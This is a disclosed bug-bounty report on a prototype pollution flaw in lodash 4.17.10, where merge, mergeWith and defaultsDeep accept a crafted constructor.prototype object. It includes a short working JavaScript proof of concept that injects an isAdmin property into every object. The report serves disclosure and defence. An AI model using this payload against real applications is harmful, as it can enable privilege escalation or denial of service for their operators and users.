# Prototype pollution attack (lodash / constructor.prototype)

## Report Details
- **Report ID**: 380873
- **URL**: https://hackerone.com/reports/380873
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-07-12T08:28:18.713Z
- **Disclosed**: 2018-10-30T12:59:31.457Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lodash
**version:** 4.17.10
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

12M downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.

```javascript
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Attachments
No attachments
